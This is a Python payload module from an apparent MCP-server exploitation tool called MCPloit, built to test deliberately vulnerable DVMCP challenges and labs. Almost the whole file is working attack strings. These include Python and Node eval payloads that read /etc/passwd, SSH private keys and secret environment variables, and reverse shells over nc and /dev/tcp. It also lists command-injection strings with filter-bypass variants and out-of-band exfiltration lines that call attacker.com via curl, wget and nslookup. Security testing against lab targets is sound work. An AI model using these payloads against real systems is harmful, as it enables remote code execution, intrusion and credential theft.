"""
Code Execution Payloads for MCPloit.

Contains payloads for testing code and command execution
vulnerabilities in MCP servers.

Target Challenges:
- DVMCP Challenge 8: Code Execution (Python exec)
- DVMCP Challenge 9: Command Injection (shell commands)
- Lab: Filesystem Workspace Actions (execute_code)
- Lab: Malicious Code Execution (JavaScript eval)
"""

from .base import Payload, PayloadCategory, PayloadSeverity


def get_payloads() -> list[Payload]:
    """Return all code execution payloads."""
    return [
        # === COMMAND INJECTION PAYLOADS ===
        # NOTE: Challenge 9 requires weak auth testing (manage_permissions has no auth check)
        # Direct execution requires calling tools with proper parameters, not payload injection

        # === JAVASCRIPT EVAL (HIGH PRIORITY - work in sandboxed contexts) ===
        # These JS payloads work in sandboxed eval() where require() is not available
        Payload(
            name="js_env_dump",
            description="JavaScript to dump all environment variables",
            category=PayloadCategory.CODE_EXECUTION,
            payload="JSON.stringify(process.env)",
            variants=["Object.keys(process.env).join(',')"],
            target_params=["format", "code", "script", "expression", "template"],
            success_indicators=["PATH", "HOME", "USER", "SHELL", "NODE", "/usr"],
            severity=PayloadSeverity.CRITICAL,
            technique="js_eval",
            context="Node.js environment dump via eval()",
        ),
        Payload(
            name="js_cwd",
            description="JavaScript to get current working directory",
            category=PayloadCategory.CODE_EXECUTION,
            payload="process.cwd()",
            variants=["process.version", "process.platform"],
            target_params=["format", "code", "script", "expression", "template"],
            success_indicators=["/home", "/usr", "/tmp", "linux", "/var"],
            severity=PayloadSeverity.HIGH,
            technique="js_eval",
            context="Node.js working directory disclosure via eval()",
        ),
        Payload(
            name="js_argv",
            description="JavaScript to get process arguments",
            category=PayloadCategory.CODE_EXECUTION,
            payload="JSON.stringify(process.argv)",
            variants=["process.argv.join(' ')"],
            target_params=["format", "code", "script", "expression", "template"],
            success_indicators=["node", "/usr", ".js", "bin"],
            severity=PayloadSeverity.HIGH,
            technique="js_eval",
            context="Node.js process arguments via eval()",
        ),
        Payload(
            name="js_memory",
            description="JavaScript to get memory usage",
            category=PayloadCategory.CODE_EXECUTION,
            payload="JSON.stringify(process.memoryUsage())",
            variants=["process.memoryUsage().heapUsed"],
            target_params=["format", "code", "script", "expression", "template"],
            success_indicators=["heapUsed", "heapTotal", "rss", "external"],
            severity=PayloadSeverity.MEDIUM,
            technique="js_eval",
            context="Node.js memory information via eval()",
        ),

        # === PYTHON CODE EXECUTION ===
        # Challenge 8: WORKS - eval() allows arbitrary Python code execution

        # === PYTHON CODE EXECUTION ===
        Payload(
            name="python_file_read",
            description="Python code to read arbitrary files",
            category=PayloadCategory.CODE_EXECUTION,
            payload="open('/etc/passwd').read()",
            variants=[
                "print(open('/etc/passwd').read())",
                "__import__('builtins').open('/etc/passwd').read()",
                "with open('/etc/passwd') as f: print(f.read())",
                "import pathlib; print(pathlib.Path('/etc/passwd').read_text())",
            ],
            target_params=["code", "python_code", "script", "expression", "command"],
            success_indicators=[
                "root:", "bin:", "/bin/bash", "nobody:"
            ],
            severity=PayloadSeverity.CRITICAL,
            technique="python_exec",
            context="Direct Python file read via exec/eval",
        ),

        Payload(
            name="python_os_command",
            description="Python code to execute shell commands",
            category=PayloadCategory.CODE_EXECUTION,
            payload="__import__('os').system('id')",
            variants=[
                "__import__('os').popen('id').read()",
                "__import__('subprocess').getoutput('id')",
                "__import__('subprocess').check_output(['id'])",
                "exec(\"import os; os.system('id')\")",
            ],
            target_params=["code", "python_code", "script", "expression"],
            success_indicators=[
                "uid=", "gid=", "groups=", "root", "www-data"
            ],
            severity=PayloadSeverity.CRITICAL,
            technique="python_os_exec",
            context="Python code to spawn shell processes",
        ),

        Payload(
            name="python_env_access",
            description="Python code to access environment variables",
            category=PayloadCategory.CODE_EXECUTION,
            payload="__import__('os').environ",
            variants=[
                "print(__import__('os').environ.get('API_KEY', ''))",
                "dict(__import__('os').environ)",
                "__import__('os').getenv('AWS_SECRET_ACCESS_KEY')",
                "print({k:v for k,v in __import__('os').environ.items()})",
            ],
            target_params=["code", "python_code", "script", "expression"],
            success_indicators=[
                "PATH=", "HOME=", "API_KEY", "AWS_", "SECRET", "TOKEN"
            ],
            severity=PayloadSeverity.CRITICAL,
            technique="env_access",
            context="Access environment variables containing secrets",
        ),

        Payload(
            name="python_reverse_shell",
            description="Python reverse shell payload",
            category=PayloadCategory.CODE_EXECUTION,
            payload="__import__('socket').socket().connect(('127.0.0.1',4444))",
            variants=[
                "__import__('os').system('nc -e /bin/sh 127.0.0.1 4444')",
                "__import__('subprocess').call(['bash','-c','bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'])",
                "exec(\"import socket,subprocess,os;s=socket.socket();s.connect(('127.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);subprocess.call(['/bin/sh','-i'])\")",
            ],
            target_params=["code", "python_code", "script"],
            success_indicators=[
                "connected", "shell", "socket", "subprocess"
            ],
            severity=PayloadSeverity.CRITICAL,
            technique="reverse_shell",
            context="Establish reverse shell connection (for testing connectivity)",
        ),

        # === SHELL COMMAND INJECTION ===
        Payload(
            name="shell_semicolon_injection",
            description="Command injection using semicolon separator",
            category=PayloadCategory.CODE_EXECUTION,
            payload="127.0.0.1; cat /etc/passwd",
            variants=[
                "localhost; id",
                "test; whoami",
                "example.com; uname -a",
                "8.8.8.8; env",
            ],
            target_params=["host", "hostname", "ip", "target", "address", "url", "domain"],
            success_indicators=[
                "root:", "uid=", "Linux", "PATH=", "www-data"
            ],
            severity=PayloadSeverity.CRITICAL,
            technique="command_injection",
            context="Classic command injection via semicolon",
        ),

        Payload(
            name="shell_pipe_injection",
            description="Command injection using pipe operator",
            category=PayloadCategory.CODE_EXECUTION,
            payload="127.0.0.1 | cat /etc/passwd",
            variants=[
                "localhost | id",
                "test | whoami",
                "example.com | env",
                "8.8.8.8 | ls -la /",
            ],
            target_params=["host", "hostname", "ip", "target", "address"],
            success_indicators=[
                "root:", "uid=", "total", "drwx", "PATH="
            ],
            severity=PayloadSeverity.CRITICAL,
            technique="command_injection",
            context="Command injection via pipe operator",
        ),

        Payload(
            name="shell_and_injection",
            description="Command injection using && operator",
            category=PayloadCategory.CODE_EXECUTION,
            payload="127.0.0.1 && cat /etc/passwd",
            variants=[
                "localhost && id",
                "test && whoami",
                "example.com && uname -a",
                "8.8.8.8 && pwd",
            ],
            target_params=["host", "hostname", "ip", "target", "address"],
            success_indicators=[
                "root:", "uid=", "Linux", "/"
            ],
            severity=PayloadSeverity.CRITICAL,
            technique="command_injection",
            context="Command injection via && operator",
        ),

        Payload(
            name="shell_backtick_injection",
            description="Command injection using backticks",
            category=PayloadCategory.CODE_EXECUTION,
            payload="`cat /etc/passwd`",
            variants=[
                "`id`",
                "`whoami`",
                "$(cat /etc/passwd)",
                "$(id)",
                "$(whoami)",
            ],
            target_params=["host", "hostname", "filename", "param", "value"],
            success_indicators=[
                "root:", "uid=", "www-data", "nobody"
            ],
            severity=PayloadSeverity.CRITICAL,
            technique="command_substitution",
            context="Command substitution using backticks or $()",
        ),

        Payload(
            name="shell_newline_injection",
            description="Command injection using newline character",
            category=PayloadCategory.CODE_EXECUTION,
            payload="127.0.0.1\ncat /etc/passwd",
            variants=[
                "localhost%0aid",
                "test\r\nwhoami",
                "example.com%0a%0denv",
                "8.8.8.8\x0aid",
            ],
            target_params=["host", "hostname", "ip", "target"],
            success_indicators=[
                "root:", "uid=", "PATH="
            ],
            severity=PayloadSeverity.CRITICAL,
            technique="newline_injection",
            context="Inject commands via newline characters",
        ),

        # === JAVASCRIPT EVAL PAYLOADS ===
        # Note: In sandboxed eval contexts, 'require' is often not available
        # but 'process' global is usually accessible
        Payload(
            name="js_process_env",
            description="JavaScript to access process environment",
            category=PayloadCategory.CODE_EXECUTION,
            payload="JSON.stringify(process.env)",
            variants=[
                "Object.keys(process.env).join(',')",
                "process.env.PATH",
                "process.env.HOME",
            ],
            target_params=["format", "code", "script", "expression", "template"],
            success_indicators=[
                "PATH", "HOME", "API_KEY", "AWS_", "SECRET", "NODE", "/usr", "/bin"
            ],
            severity=PayloadSeverity.CRITICAL,
            technique="js_eval",
            context="Node.js code to access environment via eval()",
        ),

        Payload(
            name="js_process_info",
            description="JavaScript to access process metadata",
            category=PayloadCategory.CODE_EXECUTION,
            payload="process.cwd()",
            variants=[
                "process.version",
                "process.platform",
                "process.arch",
                "JSON.stringify(process.argv)",
            ],
            target_params=["format", "code", "script", "expression", "template"],
            success_indicators=[
                "/home", "linux", "x64", "node", "v2", "/usr"
            ],
            severity=PayloadSeverity.HIGH,
            technique="js_eval",
            context="Node.js process information disclosure via eval()",
        ),

        Payload(
            name="js_memory_info",
            description="JavaScript to access process memory information",
            category=PayloadCategory.CODE_EXECUTION,
            payload="JSON.stringify(process.memoryUsage())",
            variants=[
                "JSON.stringify(process.resourceUsage())",
                "JSON.stringify(process.cpuUsage())",
            ],
            target_params=["format", "code", "script", "expression", "template"],
            success_indicators=[
                "heapUsed", "heapTotal", "rss", "external"
            ],
            severity=PayloadSeverity.MEDIUM,
            technique="js_eval",
            context="Node.js memory information via eval()",
        ),

        Payload(
            name="js_child_process",
            description="JavaScript to execute shell commands via require",
            category=PayloadCategory.CODE_EXECUTION,
            payload="require('child_process').execSync('id').toString()",
            variants=[
                "require('child_process').execSync('cat /etc/passwd').toString()",
                "require('child_process').spawnSync('whoami').stdout.toString()",
                "(function(){return require('child_process').execSync('id').toString()})()",
                "global.process.mainModule.require('child_process').execSync('id').toString()",
            ],
            target_params=["format", "code", "script", "expression"],
            success_indicators=[
                "uid=", "root:", "www-data", "node"
            ],
            severity=PayloadSeverity.CRITICAL,
            technique="js_rce",
            context="Node.js RCE via child_process module (requires non-sandboxed context)",
        ),

        Payload(
            name="js_file_system",
            description="JavaScript to read files via fs module",
            category=PayloadCategory.CODE_EXECUTION,
            payload="require('fs').readFileSync('/etc/passwd','utf8')",
            variants=[
                "require('fs').readFileSync('/etc/hosts','utf8')",
                "require('fs').readdirSync('/')",
                "require('fs').readFileSync(process.env.HOME+'/.ssh/id_rsa','utf8')",
                "(()=>require('fs').readFileSync('/etc/passwd','utf8'))()",
            ],
            target_params=["format", "code", "script", "expression"],
            success_indicators=[
                "root:", "localhost", "bin:", "ssh-rsa", "PRIVATE"
            ],
            severity=PayloadSeverity.CRITICAL,
            technique="js_file_read",
            context="Node.js file read via fs module (requires non-sandboxed context)",
        ),

        # === BYPASS TECHNIQUES ===
        Payload(
            name="encoded_command_injection",
            description="URL/hex encoded command injection payloads",
            category=PayloadCategory.CODE_EXECUTION,
            payload="127.0.0.1%3Bcat%20/etc/passwd",
            variants=[
                "127.0.0.1%26%26id",
                "127.0.0.1%7Cid",  # |
                "\\x69\\x64",  # hex for 'id'
                "$'\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'",
            ],
            target_params=["host", "hostname", "ip", "command", "param"],
            success_indicators=[
                "root:", "uid=", "bin:"
            ],
            severity=PayloadSeverity.HIGH,
            technique="encoding_bypass",
            context="Encoded payloads to bypass input filters",
            encoding="url",
        ),

        Payload(
            name="space_bypass_injection",
            description="Command injection with space character bypasses",
            category=PayloadCategory.CODE_EXECUTION,
            payload="127.0.0.1;cat${IFS}/etc/passwd",
            variants=[
                "127.0.0.1;cat</etc/passwd",
                "127.0.0.1;{cat,/etc/passwd}",
                "127.0.0.1;cat$IFS/etc/passwd",
                "127.0.0.1;X=$'\\x20';cat${X}/etc/passwd",
                "127.0.0.1;cat%09/etc/passwd",  # tab
            ],
            target_params=["host", "hostname", "ip", "command"],
            success_indicators=[
                "root:", "bin:", "nobody:"
            ],
            severity=PayloadSeverity.HIGH,
            technique="space_bypass",
            context="Bypass space filters in command injection",
        ),

        Payload(
            name="blacklist_bypass",
            description="Bypass command blacklists using alternatives",
            category=PayloadCategory.CODE_EXECUTION,
            payload="127.0.0.1;/bin/c?t /etc/passwd",
            variants=[
                "127.0.0.1;/bin/ca* /etc/passwd",  # wildcard
                "127.0.0.1;c''at /etc/passwd",  # empty quotes
                "127.0.0.1;c\"\"at /etc/passwd",
                "127.0.0.1;c\\at /etc/passwd",  # backslash
                "127.0.0.1;$(echo Y2F0Cg==|base64 -d) /etc/passwd",  # base64
            ],
            target_params=["host", "hostname", "command", "param"],
            success_indicators=[
                "root:", "bin:", "nobody:"
            ],
            severity=PayloadSeverity.HIGH,
            technique="blacklist_bypass",
            context="Bypass keyword blacklists using obfuscation",
        ),

        # === ADVANCED PAYLOADS ===
        Payload(
            name="time_based_blind",
            description="Time-based blind command injection",
            category=PayloadCategory.CODE_EXECUTION,
            payload="127.0.0.1; sleep 5",
            variants=[
                "127.0.0.1 && sleep 5",
                "127.0.0.1 | sleep 5",
                "`sleep 5`",
                "$(sleep 5)",
                "127.0.0.1; ping -c 5 127.0.0.1",
            ],
            target_params=["host", "hostname", "ip", "target"],
            success_indicators=[
                # Time-based detection - response delay
                "delay", "timeout", "slow"
            ],
            severity=PayloadSeverity.HIGH,
            technique="blind_injection",
            context="Detect blind injection via response time",
        ),

        Payload(
            name="out_of_band_injection",
            description="Out-of-band command injection detection",
            category=PayloadCategory.CODE_EXECUTION,
            payload="127.0.0.1; nslookup test.attacker.com",
            variants=[
                "127.0.0.1; curl http://attacker.com/$(whoami)",
                "127.0.0.1; wget http://attacker.com/$(id)",
                "127.0.0.1 && ping -c 1 attacker.com",
                "`nslookup $(whoami).attacker.com`",
            ],
            target_params=["host", "hostname", "ip", "target"],
            success_indicators=[
                "dns", "request", "callback", "oob"
            ],
            severity=PayloadSeverity.CRITICAL,
            technique="oob_injection",
            context="Detect blind injection via out-of-band channel",
        ),
    ]
